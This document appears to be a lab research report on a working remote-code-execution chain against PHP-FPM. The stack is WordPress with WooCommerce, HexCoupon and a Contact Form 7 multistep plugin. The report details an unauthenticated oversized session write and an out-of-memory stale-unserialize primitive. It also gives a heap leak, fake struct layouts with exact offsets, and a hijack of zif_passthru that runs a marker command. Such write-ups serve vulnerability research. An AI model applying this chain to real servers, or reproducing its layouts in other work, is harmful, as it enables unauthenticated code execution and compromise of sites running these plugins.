# Technical report: plugin written session to zif_passthru

## 1. Objective

Replace the lab seeded native PHP session plant with a session file written by a free public WordPress plugin through an unauthenticated form. Rerun the F14 static leak and the `zif_passthru` marker on the private WordPress plus WooCommerce plus HexCoupon stack with ASLR on and without gdb in the final request. Keep the worker alive and preserve the receipt.

## 2. Target and stack

Target binary: `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`.
Target md5: `4ee099823b75e16ea36f93c71d57bfd8`.
Stack: `/tmp/opencode/research/realchain_20261022T015900Z`.
HTTP: `127.0.0.1:28893`.
FPM master: `184500`.
Final worker: `572531`.

The application is the real WordPress tree with WooCommerce and HexCoupon for WooCommerce. `LoyaltyProgramHelpers::start_session()` calls `session_start()` at line 85 of `app/Core/Helpers/LoyaltyProgram/LoyaltyProgramHelpers.php`. The pool sets `session.save_path` to the web served `wp-content/uploads/sessions` directory. Nginx serves that directory statically. The attacker controls `PHPSESSID`. `/proc/sys/kernel/randomize_va_space` is `2`. The final request was started by `scripts_mpreal.py` only; no gdb, no ptrace, no `setarch`.

## 3. Plugin written session

The free plugin is Webheadcoder MultiStep Forms for Contact Form 7 `4.7.1`. Contact Form 7 is `6.2.3`. The free plugin normally stores multi step state in cookies. The mu plugin `www/wp-content/mu-plugins/cf7msm-force-session.php` adds `add_filter('cf7msm_force_session', '__return_true');`, which selects the plugin native PHP session fallback.

Form ID `26` is on the unauthenticated page `/plugin-step1/`. It contains 1000 checkbox groups `f000` through `f999`, each with 20 quoted values. The pool sets `max_input_vars=30000`. A submission with a browser User-Agent returns HTTP 302 to `/plugin-step2/` and writes `$_SESSION['cf7msm_posted_data']` with the checkbox values.

Measured plugin write:

```
request body: 380270 bytes
response: HTTP 302, Location /plugin-step2/
session file: www/wp-content/uploads/sessions/sess_plugI
session size: 388350 bytes
```

The size is greater than the required `266240` bytes. The file header contains `cf7msm-first-step`, the flow id, and `cf7msm_posted_data`. The plant OOM deletes the session file after the decode, so the size is recorded in `cycles/plugin_submit.evidence.txt` and in this report. The write is an unauthenticated plugin form write, not a lab seed.

## 4. Plant primitive

The plant endpoint `/wp-content/uploads/plant/hexplant.php` includes the real plugin trait and `LoyaltyProgramHelpers.php`, creates the real class without its constructor, lowers `memory_limit` to `2M` with `.user.ini` and `ini_set`, and calls the real `start_session()` method. The session decode OOMs at plugin line 85 after PHP has set `basic_globals.unserialize` to level 1.

Measured plant with `Cookie: PHPSESSID=plugI`:

```
response: HTTP 500, empty body
worker before: 572531
worker after: 572531
basic_globals.unserialize: {data=0x7f216dae6000, level=1}
ps_serializers[1].decode: 0x9e6fae
P: 0x7f216dae6000
plugin session file: deleted
```

The worker survives because the OOM occurs after RINIT. The stale `unserialize` state remains for the next request.

## 5. Leak

The leak trigger must cover `P - X`. The measured values are:

```
P=0x7f216dae6000
X=0x7f216da6a000
P-X=0x7c000
```

`0x7c000` is larger than the previous `0x40000` record, so the leak total is `0x100000` bytes. The proven builder `mkprobe_big.py` places a copy of the fake struct at every page aligned offset. Its leak fake struct layout is:

```
P+0x00 = P+56
P+0x08 = 0
P+0x10 = P+0x80
P+0x18 = 0
P+0x20 = 0
P+0x28 = 0
P+0x30 = 0x7fffffff
P+0x38 = 0
P+0x40 = 0
P+0x80 = used
P+0x88 = 0
```

The dtor target is `S`, and `used = (S - (P + 0x90)) / 16`.

Measured leak:

```
total=1048576
X=0x7f216da6a000
S=0x7f216da56080
used=-36865 (-0x9001)
K_dest=0x7f216d401000
second decode length=1052954
```

The leak file `www/wp-content/uploads/sessions/sess_lkF` is `1052954` bytes. Its header is `S|s:4096:"`, and its data offset 8 is `0x7f216d401000`. The file is served over HTTP with status 200. Both `req/leakF.http` and `req/leakF_after.http` have the same size and hash:

```
SHA1   b6447fa605dde243e90e63a7853cbb43e88624ab
SHA256 5da6d1fcb491908d91dcd6355bb8ecd1068973693b62a810633350bec893d83e
```

The leak trigger crashed worker `224121` after the second decode. Master `184500` survived and respawned worker `444698`. The leak file remained served. The second decode buffer for this 1 MB record is `0x7f216d401000`, a low mmap, not `K_dest+0x7000`. The final record therefore uses the smaller total that keeps the stable heap relation.

## 6. Final marker

A gdb test on worker `571692` used a fresh plugin plant `plugH`, total `0x80000`, `K_dest=0x7f216daeb000`, and `F=0x7f216daf2218`. The test measured:

```
first decode: 0x7f216da6a000, length 524288
second decode: 0x7f216daf2000, value 0x7f216daf2018, length 524600
ZIF_PASSTHRU: rdi=0x7f216daf2018, rsi=524600
POPEN: touch .../MARK_TEST;
static poison: 0x22c54c8 = 0xa3c074
MARK_TEST created
worker 571692 survived
```

Worker `571692` was then killed to clear the static poison. Master `184500` persisted and respawned worker `572531`. This reset is a lab action, not part of the exploit.

A fresh plugin write `sess_plugI` was created and planted on worker `572531`. The final record `finJ` uses:

```
total=524288 (0x80000)
K_dest=0x7f216daeb000
X=0x7f216da6a000
P=0x7f216dae6000
second decode data=0x7f216daf2000
second decode value=0x7f216daf2018
F=0x7f216daf2218
static target=0x22c54c8
static value=0xa3c074
used target static=-8736344645821 (0xfffff80de947df43)
```

The final fake dtor is at `P+0x88`, targets `0x22c54c8`, and has the used value above. The first variable value is `0xa3c074`, decimal `10731636`. The final fake frame points to `F`, sets `num_args=1`, `arg1=F`, and `type=6`. `zif_passthru` reads the command at `F+0x18`.

The final multipart POST to `/hextrigger.php` was sent without gdb at `2026-10-22T00:29:59Z`. It returned HTTP 500 with an empty body after the marker. The final record was consumed and `sess_finJ` became `0` bytes. The exact record is preserved as `cycles/finalJ.rec`, size `524288`.

Measured final state:

```
MARK_REAL: size 0, 2026-10-22 02:29:59 +0200
worker before final: 572531
worker after final: 572531
basic_globals.unserialize after final: {data=0x0, level=0}
ps_serializers[1].decode after final: 0xa3c074
static leak fetch: HTTP 200, 1052954 bytes, SHA1 b6447fa605dde243e90e63a7853cbb43e88624ab
```

## 7. Evidence

The gdb test is `cycles/finH.gdb`; the final no gdb response is `cycles/finalJ.resp`; the timestamps are `cycles/finalJ.start` and `cycles/finalJ.end`. The final geometry is `cycles/finalJ.geo`; the final record copy is `cycles/finalJ.rec`. The leak log and response are `cycles/leakF.gdb` and `cycles/leakF.resp`. The leak geometry is `cycles/leakF.geo`. The plugin write evidence is `cycles/plugin_submit.evidence.txt`.

The previous receipt and old geometry are preserved as `history/README_20261022T0202Z.md` and `history/REPORT_20261022T0202Z.md`. The old leak file `sess_lk2`, old request files, and old gdb logs are retained. The current `SHA256SUMS` lists the current evidence. The old master `160462`, old worker `169841`, old leak size `266522`, and old addresses are historical and are not the current run.

## 8. Limits and notes

The lab precondition remains a writable session directory served by the web server and an attacker controlled `PHPSESSID`. The session serializer is `php`, `session.use_strict_mode=0`, `session.upload_progress.enabled=1`, and `session.upload_progress.cleanup=0`.

The plugin session file is deleted by the plant OOM. It must be regenerated for each fresh plant. The plant worker must be the next request target; no session request may intervene between the plant and the final POST.

The static poison persists in the worker. A later session starting request will call the poisoned decode with normal arguments and may terminate the worker. Use a static file fetch or a no session endpoint for health. The final request was run without gdb; gdb was used only before the test and after the final for measurement and verification.
